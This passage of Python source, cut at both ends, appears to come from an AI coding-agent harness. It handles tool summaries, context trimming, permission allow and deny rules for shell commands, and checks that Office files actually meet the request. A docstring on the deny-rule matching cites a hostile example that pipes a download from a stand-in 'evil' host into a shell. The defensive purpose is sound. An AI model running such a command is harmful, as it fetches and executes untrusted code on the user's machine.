    """One calm line per retry instead of the raw network error."""
    m = msg.lower()
    if "http 0" in m or "connection" in m or "timed out" in m:
        why = "Can't reach the model right now"
    elif "429" in m or "rate" in m:
        why = "The model is busy"
    elif "5" in m[:8] or "http 5" in m:
        why = "The model service had a problem"
    else:
        why = "The model call didn't go through"
    return f"{why}. Trying again ({attempt + 1} of 5)…"


class Interrupted(Exception):
    pass


def _summary(name: str, args: dict) -> str:
    """One line for the tool card. Arguments come from the model unchecked, so any value may be missing or of the
    wrong type: never raise."""
    try:
        return str(_summary_of(name, {k: ("" if v is None else v) for k, v in args.items()}))
    except Exception:  # noqa: BLE001
        s = json.dumps(args, ensure_ascii=False, default=str)
        return s if len(s) < 300 else s[:300] + "..."


def _patch_files(patch: str) -> list:
    return re.findall(r"(?m)^\*\*\* (?:Add|Update|Delete) File: (.+?)\s*$", str(patch or ""))


def _summary_of(name: str, args: dict) -> str:
    if name == "shell":
        cmd = T.shell_script(args.get("command"))
        return (f"cd {args['workdir']} && " if args.get("workdir") else "") + cmd
    if name == "exec_command":
        return (f"cd {args['workdir']} && " if args.get("workdir") else "") + str(args.get("cmd") or "")
    if name == "apply_patch":
        files = _patch_files(args.get("input"))
        return ", ".join(files[:6]) + (f" (+{len(files) - 6} more)" if len(files) > 6 else "") if files else "patch"
    if name == "update_plan":
        items = args.get("plan") or []
        return f"{sum(1 for i in items if isinstance(i, dict) and i.get('status') == 'completed')}/{len(items)} done"
    if name in ("bash", "bash_start"):
        return args.get("command", "")
    if name in ("bash_output", "bash_stop"):
        return args.get("id", "") or "all"
    if name == "bash_many":
        return " ; ".join(str(c) for c in args.get("commands") or [])[:400]
    if name == "edit" and isinstance(args.get("changes"), list):     # one call, several files
        paths = list(dict.fromkeys(str(c.get("path", "")) for c in args["changes"] if isinstance(c, dict)))
        return ", ".join(paths[:6]) + (f" (+{len(paths) - 6} more)" if len(paths) > 6 else "")
    if name in ("read_file", "write_file", "edit"):
        s = args.get("path", "")
        if name == "read_file" and (args.get("start") or args.get("end")):
            s += f" (lines {args.get('start', 1)}-{args.get('end', 'end')})"
        return s
    if name == "grep":
        return f"{args.get('pattern', '')}" + (f" in {args['path']}" if args.get("path") else "") + \
            (f" ({args['glob']})" if args.get("glob") else "")
    if name == "glob":
        return args.get("pattern", "")
    if name == "fetch_url":
        return args.get("url", "")
    if name == "office_task":
        return f"{args.get('engine', '')}: {str(args.get('request', ''))[:160]}"
    if name == "web_search":
        return args.get("query", "")
    if name == "web_research":
        return str(args.get("question", ""))[:160]
    if name == "use_skill":
        return args.get("name", "")
    if name == "ask_user":
        qs = args.get("questions") if isinstance(args.get("questions"), list) else []
        return " / ".join(str(q.get("question", "")) for q in qs if isinstance(q, dict))[:300]
    if name == "todo_write":
        items = args.get("items") or []
        return f"{sum(1 for i in items if isinstance(i, dict) and i.get('status') == 'completed')}/{len(items)} done"
    s = json.dumps(args, ensure_ascii=False)
    return s if len(s) < 300 else s[:300] + "..."


def _env_snapshot(root: Path) -> str:
    """Harness v3: a short look at the project and the tools on this computer, so the first steps are not spent
    finding them. Cross-platform, a few seconds at most."""
    import shutil
    import subprocess
    lines = []
    try:
        names = sorted(p.name + ("/" if p.is_dir() else "") for p in root.iterdir() if not p.name.startswith(".git"))
        lines.append("Project folder: " + ", ".join(names[:40]) + (f" (+{len(names) - 40} more)" if len(names) > 40 else ""))
    except OSError:
        pass
    try:
        sh = C.find_bash() if os.name == "nt" else shutil.which("bash")
    except Exception:  # noqa: BLE001
        sh = None
    import platform
    lines.append(f"System: {platform.system()} {platform.release()}; shell: " + (
        "bash (use && and heredocs)" if sh else "PowerShell or cmd (no bash: use ; not &&, and PowerShell cmdlets)"))
    vers = []
    for tool, arg in (("python3", "--version"), ("python", "--version"), ("node", "--version"), ("git", "--version"),
                      ("go", "version"), ("cargo", "--version"), ("java", "-version"), ("docker", "--version")):
        exe = shutil.which(tool)
        if not exe or (tool == "python" and any(v.startswith("python3") for v in vers)):
            continue
        try:
            r = subprocess.run([exe, arg], capture_output=True, text=True, timeout=3,
                               creationflags=0x08000000 if os.name == "nt" else 0)
            v = (r.stdout or r.stderr).strip().splitlines()
            if v and r.returncode == 0:
                vers.append(f"{tool}: {v[0][:80]}")
        except Exception:  # noqa: BLE001
            pass
    if vers:
        lines.append("Tools: " + "; ".join(vers))
    return "\n".join(lines)


def _context_size(messages: list) -> int:
    """Characters a request carries: text contents, text parts, tool-call arguments, and a share per image."""
    n = 0
    for m in messages:
        c = m.get("content")
        if isinstance(c, str):
            n += len(c)
        elif isinstance(c, list):
            n += sum(len(str(p.get("text") or "")) if p.get("type") == "text" else 4000
                     for p in c if isinstance(p, dict))
        for tc in m.get("tool_calls") or []:
            n += len(str((tc.get("function") or {}).get("arguments") or ""))
    return n


def _shrink_args(messages: list, keep: int = 200) -> None:
    """Shorten long string values in the arguments of past tool calls (file contents written, long edits); the
    arguments stay valid JSON."""
    for m in messages:
        for tc in m.get("tool_calls") or []:
            f = tc.get("function") or {}
            raw = f.get("arguments") or ""
            if len(raw) <= 3 * keep:
                continue
            try:
                a = json.loads(raw)
            except (ValueError, TypeError):
                continue
            if not isinstance(a, dict):
                continue
            for k, v in a.items():
                if isinstance(v, str) and len(v) > 3 * keep:
                    a[k] = v[:keep] + f" ...[{len(v) - keep} chars elided at compaction]"
            f["arguments"] = json.dumps(a, ensure_ascii=False)


def _shrink_context(messages: list, limit: int, hard: bool = False, keep_images: int = 0) -> None:
    """Make the conversation fit: elide older tool outputs, keeping fewer recent ones verbatim until it is under
    `limit`, then shorten long tool-call arguments. hard (the endpoint said the request is over the model's context):
    all of that at once, whatever the size, keeping only the outputs of the latest step."""
    if hard:
        last = max((i for i, m in enumerate(messages) if m.get("role") == "assistant"), default=-1)
        _compact(messages, keep_recent=sum(1 for m in messages[last + 1:] if m.get("role") == "tool"))
        for m in messages[last + 1:]:
            c = m.get("content")
            if m.get("role") == "tool" and isinstance(c, str) and len(c) > T.MAX_TOOL_CHARS:
                m["content"] = (c[:T.HEAD] + f"\n... [{len(c) - T.HEAD - T.TAIL} chars cut: the conversation was "
                                "over the model's context] ...\n" + c[-T.TAIL:])
        _shrink_args(messages)
        _drop_images(messages, keep=keep_images)
        return
    for keep in (12, 4, 1):
        _compact(messages, keep_recent=keep)
        if _context_size(messages) <= limit:
            return
    _shrink_args(messages)


def _args_ok(call: dict) -> bool:
    try:
        return isinstance(json.loads((call.get("function") or {}).get("arguments") or "{}"), dict)
    except (ValueError, TypeError):
        return False


def _image_part(im: dict) -> dict:
    """An image_url part for an attached or returned image, shrunk when it is huge (OSS-23: one 12 MB photo must not
    brick a chat). The file on disk is untouched; the chat stores the smaller one."""
    from meshpool_harness.core import compat as _CP
    return {"type": "image_url", "image_url": {"url": _CP.shrink_image_url(
        f"data:{im.get('mime') or 'image/png'};base64,{im['data']}")}}


def _shrunk(im: dict) -> dict:
    """{"mime", "data"} of an image after shrink_image_url (the same ones when it is within limits)."""
    url = _image_part(im)["image_url"]["url"]
    head, _, data = url.partition(";base64,")
    return {"mime": head[5:], "data": data}


def _has_images(messages: list) -> bool:
    return any(isinstance(m.get("content"), list) and any(p.get("type") == "image_url" for p in m["content"])
               for m in messages)


def _blind_copy(messages: list) -> list:
    """The messages with every image part replaced by a short text, for a model that cannot see images.
    Copies only what it changes; the chat history keeps its images."""
    out = []
    for m in messages:
        c = m.get("content")
        if isinstance(c, list) and any(p.get("type") == "image_url" for p in c):
            m = dict(m, content=[{"type": "text", "text": "[image left out: this model cannot see images]"}
                                 if p.get("type") == "image_url" else p for p in c])
        out.append(m)
    return out


def _drop_images(messages: list, keep: int = 0) -> None:
    """Replace all but the latest `keep` images in the conversation with a short note."""
    seen = 0
    for m in reversed(messages):
        c = m.get("content")
        if not isinstance(c, list):
            continue
        new = []
        for part in reversed(c):
            if part.get("type") == "image_url":
                seen += 1
                if seen > keep:
                    continue
            new.append(part)
        new.reverse()
        if len(new) != len(c):
            if not any(p.get("type") == "image_url" for p in new):
                m["content"] = " ".join(p.get("text", "") for p in new if p.get("type") == "text") + \
                    " [screenshot removed to save space]"
            else:
                m["content"] = new


# Built-in tools that only read: when the model asks for several at once they run at the same time (a turn with five
# file reads and two greps takes as long as the slowest, not the sum). Edits, commands and MCP tools keep their order.
PARALLEL_SAFE = {"read_file", "grep", "glob", "fetch_url", "web_search", "web_research", "diagnostics", "find_skill",
                 "use_skill"}
PARALLEL = os.environ.get("MH_PARALLEL_TOOLS", "1") != "0"


def _batches(calls: list) -> list:
    """Consecutive read-only calls grouped together; everything else on its own, in order."""
    out, run = [], []
    for c in calls:
        if PARALLEL and (c.get("function") or {}).get("name") in PARALLEL_SAFE:
            run.append(c)
            continue
        if run:
            out.append(run)
            run = []
        out.append([c])
    if run:
        out.append(run)
    return out


# Fields a model may refuse with HTTP 400 ("does not support the `temperature` field", "Unsupported parameter:
# 'max_tokens'..."). The fix is known for each: drop it, or swap max_tokens for max_completion_tokens. What a model
# refused is remembered for the process, so the next request is right the first time. (Same class of problem as
# HarnessRouter's measured reasoning table, runner/reasoning.py: a field a model lacks is refused, not ignored.)
from meshpool_harness.core.modelcaps import RefusedView as _RefusedView  # noqa: E402
_REFUSED = _RefusedView()      # one record with ModelCaps.learn_refused (persisted per endpoint)
_ADAPTABLE = ("temperature", "top_p", "tool_choice", "parallel_tool_calls", "stream_options", "reasoning_effort",
              "max_tokens", "response_format", "seed", "presence_penalty", "frequency_penalty")


def _refused_field(msg: str) -> str | None:
    low = (msg or "").lower()
    if not re.search(r"http 4(00|22)", low):
        return None
    for f in _ADAPTABLE:
        if re.search(r"(not support|unsupported|unknown|unrecognized|not allowed|invalid|extra inputs?|not permitted)"
                     r"[^.]{0,80}\W" + f + r"\W|\W" + f + r"\W[^.]{0,80}(not supported|unsupported|is not allowed|"
                     r"not permitted|unknown|unrecognized|use 'max_completion_tokens'|instead)", low):
            return f
    return None


def _adapt_params(body: dict, msg: str) -> bool:
    """Fix a request a model refused for one of its fields. True when the body changed (try again)."""
    f = _refused_field(msg)
    if not f or f not in body and not (f == "max_tokens" and "max_tokens" in body):
        return False
    _REFUSED.setdefault(str(body.get("model", "")), set()).add(f)
    if f == "max_tokens":
        body["max_completion_tokens"] = body.pop("max_tokens")
    else:
        body.pop(f, None)
    return True


def _apply_refused(body: dict) -> dict:
    for f in _REFUSED.get(str(body.get("model", "")), ()):
        if f == "max_tokens" and "max_tokens" in body:
            body["max_completion_tokens"] = body.pop("max_tokens")
        else:
            body.pop(f, None)
    return body


_PROMISE = re.compile(
    r"(?:\b(?:I'll|I will|I am going to|I'm going to|let me|now I(?:'ll| will)|next,? I(?:'ll| will)|next up)\b"
    r"|\b(?:shall|should) I (?:proceed|continue|go ahead|start|begin)\b"
    r"|\b(?:want|like) me to (?:proceed|continue|go ahead|start|begin|keep going)\b"
    r"|\bdo you want me to (?:proceed|continue|go ahead|keep going)\b)", re.I)


def _stopped_early(final: str) -> bool:
    """True when a reply that ended the turn ends with a promise of more work ("Now I'll run the tests.") or asks
    leave to carry on ("Shall I proceed?"): the model stopped in the middle of the job (E2E-AUTONOMY)."""
    tail = [p for p in re.split(r"\n\s*\n", str(final or "").strip()) if p.strip()]
    if not tail:
        return False
    last = " ".join(tail[-1].split())[-400:]
    if re.search(r"let me know|I'll need|I will need|I'll wait|I can't|I cannot|I'm unable|I am unable", last, re.I):
        return False
    last_sentence = re.split(r"(?<=[.!?])\s+", last)[-1]
    return bool(_PROMISE.search(last_sentence))


_DESTRUCTIVE = PR.DESTRUCTIVE                   # shared with re-check on edit (core/tools.py _recheckable)


def _rules(root) -> dict:
    """Saved allow and deny rules: ~/.meshpool/permissions.json and <project>/.meshpool/permissions.json, each
    {"allow": [...], "deny": [...]}. A rule is a tool name ("edit", "mcp__browser__ui_audit"), or "bash:" and a command
    pattern with * wildcards ("bash:npm test*"). Deny wins over allow; the project's rules add to the user's."""
    out = {"allow": [x.strip() for x in os.environ.get("MH_ALLOW", "").split(",") if x.strip()],
           "deny": [x.strip() for x in os.environ.get("MH_DENY", "").split(",") if x.strip()]}
    from meshpool_harness.agent import extras as EX
    trusted = EX.project_trusted(root)
    for f in (C.home() / "permissions.json", Path(root) / ".meshpool" / "permissions.json"):
        try:
            d = json.loads(f.read_text(encoding="utf-8"))
        except (OSError, ValueError):
            continue
        if not isinstance(d, dict):
            continue
        for k in out:
            if k == "allow" and f.parent != C.home() and not trusted:
                continue                       # an untrusted project's own "allow" rules pre-approve nothing
            out[k] += [str(x) for x in (d.get(k) or []) if isinstance(x, str)]
    return out


_CHAIN = re.compile(r"&&|\|\||[;|\n]|(?<![>&\d])&(?![&>])")


_ASSIGN = re.compile(r"""^(?:env\s+)?(?:[A-Za-z_]\w*=(?:'[^']*'|"[^"]*"|\S*)\s+)+|^env\s+""")


def _deny_forms(part: str) -> list[str]:
    """One command as a deny rule sees it: as written, without leading VAR=x assignments (and `env`), and with the
    program's folder dropped (/usr/bin/curl is curl)."""
    out = [part]
    bare = _ASSIGN.sub("", part).strip()
    out.append(bare)
    first, _, rest = bare.partition(" ")
    if "/" in first:
        out.append((first.rsplit("/", 1)[-1] + " " + rest).strip())
    return out


def _bash_segments_match(cmd: str, pattern: str, deny: bool = False) -> bool:
    """A "bash:" rule matches only when every part of a chained command (; && || | & or a new line) matches the
    pattern, and never a command with a substitution: "bash:npm test*" must not allow "npm test; curl evil | sh".
    deny=True (a deny rule): any part matching is enough, a substitution ($(...), backticks, <(...)) always counts
    as a match since what it runs cannot be read, and `X=1 curl ...` is matched as `curl ...`."""
    import fnmatch
    cmd = cmd.strip()
    if deny:
        if re.search(r"\$\(|`|[<>]\(", cmd):
            return True
        parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()] + [cmd]
        return any(fnmatch.fnmatchcase(f, pattern) for x in parts for f in _deny_forms(x))
    if "$(" in cmd or "`" in cmd:
        return False
    parts = [x.strip() for x in _CHAIN.split(cmd) if x.strip()]
    if len(parts) <= 1:
        return fnmatch.fnmatchcase(cmd, pattern)
    if _CHAIN.search(pattern):                     # the rule itself names a chain: part by part, same number of
        pp = [x.strip() for x in _CHAIN.split(pattern) if x.strip()]   # parts, so a trailing * never covers a
        ops = lambda t: [o.strip() for o in _CHAIN.findall(t)]     # noqa: E731  part added, and the same operators
        return len(pp) == len(parts) and ops(cmd) == ops(pattern) and \
            all(fnmatch.fnmatchcase(x, y) for x, y in zip(parts, pp))   # in order (`a && b` never allows `a; b`)
    return all(fnmatch.fnmatchcase(x, pattern) for x in parts)


_TEST_RUN = re.compile(
    r"\b(pytest|py\.test|unittest|nosetests|tox|nox|jest|vitest|mocha|karma|playwright\s+test|rspec|phpunit|ctest|"
    r"go\s+(test|vet)|cargo\s+(test|check|clippy|nextest)|(npm|yarn|pnpm|bun)\s+(run\s+)?(test|check|lint)\w*|"
    r"bun\s+test|deno\s+(test|check|lint)|make\s+(test|check|lint)\w*|mvn\s+\S*\s*(test|verify)|"
    r"gradlew?\s+\S*\s*(test|check)|dotnet\s+test|swift\s+test|mix\s+test|ruff|flake8|pylint|mypy|pyright|eslint|"
    r"tsc|tests?|checks?|lint)\b", re.I)
_PIPEFAIL = re.compile(r"(^|[\s;&(])-\w*o\s+pipefail\b")      # set -o pipefail, set -euo pipefail, bash -o pipefail


def _pipe_stages(cmd: str) -> list[str]:
    """The stages of a shell command split at its unquoted pipes (| and |&, not ||); one stage when there are none.
    Quotes and backslash escapes are honoured, so `grep 'a|b' x` is a single stage."""
    stages, cur, quote, i = [], [], "", 0
    while i < len(cmd):
        ch = cmd[i]
        if quote:
            if ch == "\\" and quote == '"' and i + 1 < len(cmd):
                cur.append(cmd[i:i + 2])
                i += 2
                continue
            if ch == quote:
                quote = ""
        elif ch == "\\" and i + 1 < len(cmd):
            cur.append(cmd[i:i + 2])
            i += 2
            continue
        elif ch in "'\"":
            quote = ch
        elif ch == "|":
            if cmd[i + 1:i + 2] == "|":                  # || is "or", not a pipe
                cur.append("||")
                i += 2
                continue
            stages.append("".join(cur))
            cur = []
            i += 2 if cmd[i + 1:i + 2] == "&" else 1     # |& pipes stderr too
            continue
        cur.append(ch)
        i += 1
    stages.append("".join(cur))
    return stages


def _piped_check_hides_status(cmd: str) -> bool:
    """True when a test or check run feeds a pipe (`pytest -q | tail -5`) and pipefail is not on: the shell's exit
    status is then the last stage's (tail's), so a failing run can still exit 0. Commands run with plain bash -c."""
    stages = _pipe_stages(cmd or "")
    if len(stages) < 2 or _PIPEFAIL.search(cmd):
        return False
    return any(_TEST_RUN.search(s) for s in stages[:-1])


def _check_line(cmd: str, shown: str, code: int) -> str:
    """The receipt's verdict on the last command after the last change: never "passed" when the exit status could
    not show a failure (a check piped into another command without pipefail)."""
    if code != 0:
        return f"`{shown}` FAILED (exit {code})"
    if _piped_check_hides_status(cmd):
        return (f"`{shown}` ran (exit status is the last command's in the pipe; failures before it are not visible)")
    if _TEST_RUN.search(cmd or "") and re.search(r"\|\|\s*(?:true\b|:(?=\s|;|$)|exit\s+0\b)", cmd or ""):
        return f"`{shown}` ran (its exit status is ignored by `|| true`, so a failure would not show)"
    return f"`{shown}` passed"


def _rule_hit(rules: list, name: str, args: dict, deny: bool = False) -> str:
    import fnmatch
    from meshpool_harness.core import permrules as PR
    cmds = PR.commands_of(name, args)
    for r in rules:
        if r.startswith("bash:"):
            if deny:                                  # a deny rule hits when any part of a chained command matches
                if any(_bash_segments_match(x, r[5:].strip(), deny=True) for c in cmds for x in _CHAIN.split(c) + [c]):
                    return r
            elif cmds and not any(PR.writes(c) for c in cmds) and \
                    all(_bash_segments_match(c, r[5:].strip()) for c in cmds):
                return r                              # an allow rule never covers a command that redirects output
        elif fnmatch.fnmatchcase(name, r) or fnmatch.fnmatchcase(name.replace("-", "_"), r) or \
                name.replace("-", "_") in PR.TOOL_FAMILY.get(r.strip().lower(), ()):
            return r                                  # "bash" also names shell, "edit" also apply_patch (the lean tools)
    return ""


_WALK_SKIP = frozenset({".git", "node_modules", ".venv", "venv", "env", "__pycache__", ".mypy_cache", ".pytest_cache",
                        ".ruff_cache", ".tox", "dist", "build", ".next", "target", "Meshpool outputs"})


def _recent_office(root, since: float, ext: str, cap: int = 20000) -> list:
    """Office files (by extension) modified at or after `since` under root: one bounded walk that skips version
    control, dependency and build folders and stops after `cap` entries, so a pre-answer check never stalls a chat
    rooted in a large folder (code review: five full rglob walks per answer). Cached per (root, since) for a turn."""
    key = (str(root), since)
    cache = _recent_office.__dict__.setdefault("cache", {})
    if key not in cache or time.time() - cache[key][0] > 2:      # one answer's checks share a walk, never the next
        found, seen = [], 0
        for d, dirs, files in os.walk(str(root)):
            dirs[:] = [x for x in dirs if x not in _WALK_SKIP and not x.startswith(".")]
            for f in files:
                seen += 1
                if f.startswith("~$") or not f.lower().endswith((".pptx", ".xlsx", ".docx")):
                    continue
                fp = Path(d) / f
                try:
                    if fp.stat().st_mtime >= since:
                        found.append(fp)
                except OSError:
                    pass
            if seen >= cap:
                break
        cache.clear()
        cache[key] = (time.time(), found)
    return [f for f in cache[key][1] if f.suffix.lower() == ext]


_SLIDES = re.compile(r"\b(\d{1,2})\s*(?:to|-|–|or)\s*(\d{1,2})[\s-]+slides?\b|\b(\d{1,2})[\s-]+slides?\b", re.I)


def _slide_count_miss(asked: str, root, since: float) -> str:
    """A deck written this turn whose slide count is outside the count the request states ("4 to 6 slides", "a
    10-slide deck"), as a note for the agent; "" when there is no stated count or it is met. Office-7 on 59e49c8b:
    pptx_chart built 3 slides for "Make deck.pptx, 4 to 6 slides ..." and answered done."""
    import zipfile
    from meshpool_harness.capabilities import SEP as _SEP
    text = str(asked or "").split(_SEP)[0]
    m = _SLIDES.search(text)
    # a deck the request makes ("Make deck.pptx, 4 to 6 slides"), not "the first 3 slides of" or "add 2 slides to"
    if not m or not re.search(r"\b(?:make|create|build|prepare|produce|generate|draft|put together|turn)\b", text, re.I) \
            or re.search(r"\b(?:first|last|top|add|insert|remove|delete|drop|of the)\s+\d{1,2}\s+slides?\b", text, re.I):
        return ""
    lo, hi = (int(m.group(1)), int(m.group(2))) if m.group(1) else (int(m.group(3)), int(m.group(3)))
    lo, hi = min(lo, hi), max(lo, hi)
    out = []
    try:
        for f in _recent_office(root, since, ".pptx"):
            with zipfile.ZipFile(f) as z:
                n = sum(1 for x in z.namelist() if re.fullmatch(r"ppt/slides/slide\d+\.xml", x))
            if not lo <= n <= hi:
                out.append(f"{f.name} has {n} slides")
    except (OSError, zipfile.BadZipFile):
        return ""
    if not out:
        return ""
    want = f"{lo} to {hi}" if lo != hi else str(lo)
    return (f"The request asks for {want} slides, but " + "; ".join(out) + ". The job is not done: change the deck "
            "so it has the number of slides asked for, save it and check again.")


_TOTAL_ROW = re.compile(r"\b(?:a\s+|the\s+)?totals?\s+row\b|\brow\s+(?:of|for|with)\s+(?:the\s+)?totals?\b", re.I)


def _total_row_miss(asked: str, root, since: float) -> str:
    """A workbook written this turn for a request that asks for a total row, where no row that sums (=SUM...) carries a
    "Total" label: as a note for the agent, else "". Office-7 on 59e49c8b: xlsx_edit wrote =SUM in the last row with no
    label, so neither the user nor a reader of the sheet could tell it was the total."""
    from meshpool_harness.capabilities import SEP as _SEP
    text = str(asked or "").split(_SEP)[0]
    if not re.search(r"\b(?:add|insert|include|create|make|put|with)\b[^.]{0,40}?\btotals?\s+row|"
                     r"\b(?:add|insert|include|create|make)\b[^.]{0,40}?\brow\s+(?:of|for)\s+(?:the\s+)?totals?\b",
                     text, re.I):
        return ""                                    # "remove the total row", "highlight the total row": not asked for
    try:
        import openpyxl
    except ImportError:
        return ""
    bad = []
    try:
        for f in _recent_office(root, since, ".xlsx"):
            wb = openpyxl.load_workbook(f)
            sums = labelled = 0
            for ws in wb.worksheets:
                for row in ws.iter_rows():
                    vals = [c.value for c in row]
                    if any(isinstance(v, str) and v.startswith("=") and "SUM" in v.upper() for v in vals):
                        sums += 1
                        if any(isinstance(v, str) and not v.startswith("=") and re.search(r"total", v, re.I)
                               for v in vals):
                            labelled += 1
            if sums and not labelled:
                bad.append(f"{f.name} has a summing row but no cell in it says Total")
            elif not sums:
                bad.append(f"{f.name} has no row that sums with a formula")
    except Exception:  # noqa: BLE001 - a file that cannot be read is not judged here
        return ""
    if not bad:
        return ""
    return ("The request asks for a total row, but " + "; ".join(bad) + ". The job is not done: add the total row "
            "with a live =SUM formula and a \"Total\" label in that row, save it and check again.")


_TEMPLATE = re.compile(r"[\w][\w.()-]*template[\w.()-]*\.docx\b|\btemplate\b", re.I)


def _template_format_miss(asked: str, root, since: float) -> str:
    """Documents made this turn from a .docx template that keep none of its bold or italic: as a note, else "".
    Office-7 on 59e49c8b: docx_mailmerge replaced placeholders paragraph by paragraph and the template's bold amount
    run was lost in every letter."""
    from meshpool_harness.capabilities import SEP as _SEP
    text = str(asked or "").split(_SEP)[0]
    if not _TEMPLATE.search(text):
        return ""
    names = re.findall(r"[\w][\w.()-]*\.docx\b", text)
    tpl = next((Path(root) / n for n in names if "template" in n.lower() and (Path(root) / n).is_file()), None)
    if tpl is None:
        return ""
    try:
        import docx
    except ImportError:
        return ""

    def marks(path):
        d = docx.Document(str(path))
        runs = [r for p in d.paragraphs for r in p.runs if r.text.strip()]
        runs += [r for t in d.tables for row in t.rows for cell in row.cells for p in cell.paragraphs for r in p.runs
                 if r.text.strip()]
        return any(r.bold for r in runs), any(r.italic for r in runs)
    try:
        want_b, want_i = marks(tpl)
        if not (want_b or want_i):
            return ""
        lost = []
        for f in _recent_office(root, since, ".docx"):
            if f.resolve() == tpl.resolve():
                continue
            b, i = marks(f)
            if (want_b and not b) or (want_i and not i):
                lost.append(f.name)
    except Exception:  # noqa: BLE001 - a file that cannot be read is not judged here
        return ""
    if not lost:
        return ""
    shown = ", ".join(lost[:5]) + (f" and {len(lost) - 5} more" if len(lost) > 5 else "")
    return (f"{shown} lost the template's {'bold' if want_b else 'italic'} formatting. The job is not done: fill the "
            "placeholders run by run (replace the text inside each run, keeping its bold and italic), save and check "
            "again.")


def _off_slide_miss(root, since: float) -> str:
    """Shapes outside the slide in a deck written this turn, as a note; else "". Office-7 on 9cd021c0: pptx_chart r1
    failed with 2 shapes past the slide's edge after 3-5 check_deck runs."""
    try:
        from pptx import Presentation
    except ImportError:
        return ""
    out = []
    try:
        for f in _recent_office(root, since, ".pptx"):
            prs = Presentation(str(f))
            W, H = prs.slide_width or 0, prs.slide_height or 0
            for i, slide in enumerate(prs.slides, 1):
                for sh in slide.shapes:
                    x, y, w, h = sh.left, sh.top, sh.width, sh.height
                    if None in (x, y, w, h) or not W or not H:
                        continue
                    if x < 0 or y < 0 or x + w > W * 1.01 or y + h > H * 1.01:
                        out.append(f"{f.name} slide {i}: \"{sh.name}\"")
    except Exception:  # noqa: BLE001 - a deck that cannot be read is not judged here
        return ""
    if not out:
        return ""
    return ("These shapes reach past the edge of the slide: " + "; ".join(out[:6]) + ". The job is not done: move or "
            "resize them inside the slide (left + width <= slide width, top + height <= slide height), save and "
            "check again.")


_NOW_WORDS = re.compile(r"\b(?:today|now|current\s+(?:date|day|month|year|time)|this\s+(?:year|month)|"
                        r"as\s+of\s+(?:today|now)|live\s+date|dynamic)\b", re.I)
_VOLATILE = re.compile(r"\b(?:TODAY|NOW)\s*\(", re.I)


def _volatile_date_miss(asked: str, root, since: float) -> str:
    """A workbook written this turn whose formulas call TODAY() or NOW() when the request never asks for the current
    date: as a note; else "". The harness tells the model today's date, and a formula built on it drifts from the
    years the request names. SpreadsheetBench sb-39515 (f133d912, 6 reps): 3 reps wrote YEAR(TODAY())-1 for "the
    previous year (2022)", which is 2025 on the day of the run, and all 3 failed; the 3 that kept 2022/2023 passed.
    Replayed on the 102 office runs of f133d912 it fires on exactly those 3."""
    from meshpool_harness.capabilities import SEP as _SEP
    text = str(asked or "").split(_SEP)[0]
    if _NOW_WORDS.search(text) and not re.search(r"\b(?:19|20)\d{2}\b", text):
        return ""                              # "today's date": asked for; a named year ("the current year (2023)") wins
    hits = []
    try:
        import openpyxl
        for f in _recent_office(root, since, ".xlsx"):
            if "Meshpool outputs" in f.parts:
                continue
            wb = openpyxl.load_workbook(f, read_only=True)
            try:
                for ws in wb.worksheets:
                    hit = next((c.coordinate for row in ws.iter_rows() for c in row
                                if isinstance(getattr(c, "value", None), str) and c.value.startswith("=")
                                and _VOLATILE.search(c.value)), None)
                    if hit:
                        hits.append(f"{f.name}!{ws.title}!{hit}")
            finally:
                wb.close()
    except Exception:  # noqa: BLE001 - a check never breaks the answer
        return ""
    if not hits:
        return ""
    return ("The job is not done: " + ", ".join(hits[:3]) + " use TODAY() or NOW(), but the request never asks for the "
            "current date. Put the years, dates and labels the request names into the formula as literal values "
            "(for example 2022, not YEAR(TODAY())-1), save, and check again.")


def _unchanged_output_miss(asked: str, root, since: float) -> str:
    """An edit request whose workbook output, written this turn, holds the same cell values as the input it names:
    as a note; else "". SpreadsheetBench sb-374-31 (4 runs, 0 passes): it read "blank rows above Code" as rows blank
    in every column, deleted nothing and saved an identical copy."""
    from meshpool_harness.capabilities import SEP as _SEP
    text = str(asked or "").split(_SEP)[0]
    if not re.search(r"\b(?:delete|remove|drop|clear|sort|filter|fill|replace|change|fix|correct|update|add|insert|"
                     r"merge|split|move|rename|highlight|format)\b", text, re.I):
        return ""
    try:
        import openpyxl
    except ImportError:
        return ""

    def values(path):                                # values and the visible style: a formatting-only edit differs
        wb = openpyxl.load_workbook(path)
        return [[(c.value, bool(c.font and c.font.b), bool(c.font and c.font.i),
                  str(getattr(getattr(c.font, "color", None), "rgb", "")) if c.font else "",
                  str(getattr(getattr(c.fill, "fgColor", None), "rgb", "")) if c.fill else "", c.number_format)
                 for c in row] for ws in wb.worksheets for row in ws.iter_rows()]
    try:
        names = {n.lower() for n in re.findall(r"[\w][\w.()-]*\.xlsx\b", text)}
        outs = _recent_office(root, since, ".xlsx")
        if not outs:
            return ""
        inputs = [Path(root) / n for n in re.findall(r"[\w][\w.()-]*\.xlsx\b", text)
                  if (Path(root) / n).is_file() and (Path(root) / n).stat().st_mtime < since]
        if not inputs:
            return ""
        src = {f: values(f) for f in inputs}
        same = []
        for f in outs:
            if f in src:
                continue
            v = values(f)
            if any(v == sv for sv in src.values()):
                same.append(f.name)
    except Exception:  # noqa: BLE001
        return ""
    if not same:
        return ""
    return (", ".join(same[:3]) + " holds exactly the same cells as the input, so nothing the request asked for was "
            "done. Re-read the request the way the user evidently means it (a row is \"blank\" when the column that "
            "identifies it is empty, not only when every cell is), change the file, save and check again.")


_XL_ERRORS = ("#VALUE!", "#REF!", "#NAME?", "#DIV/0!", "#N/A", "#NUM!", "#NULL!")
_SAYS_WRONG = (r"\b(?:incorrect|wrong|not work\w*|doesn'?t work|does not work|isn'?t working|is not working|"
               r"not (?:giving|returning|showing|calculating)|fix(?:ed)?|error|broken)\b")


def _formulas(path) -> dict:
    """{(sheet, cell): formula text} of a workbook, read without LibreOffice; {} when it cannot be read."""
    try:
        import openpyxl
        wb = openpyxl.load_workbook(path)
    except Exception:  # noqa: BLE001
        return {}
    forms = {}
    for ws in wb.worksheets:
        for row in ws.iter_rows():
            for c in row:
                v = c.value
                t = getattr(v, "text", v)                  # an array formula keeps its text in .text
                if isinstance(t, str) and t.startswith("="):
                    forms[(ws.title, c.coordinate)] = t
    return forms


def _recalc_formulas(path, tmp: str, forms: dict | None = None, timeout: float = 30) -> dict | None:
    """{(sheet, cell): (formula text, value after a LibreOffice recalculation)} for every formula cell of a workbook;
    None when it cannot be done here (no LibreOffice, no openpyxl, a timeout)."""
    try:
        import subprocess
        import openpyxl
        from meshpool_harness import office_runtime
    except ImportError:
        return None
    exe = office_runtime.find_soffice()
    if not exe:
        return None
    try:
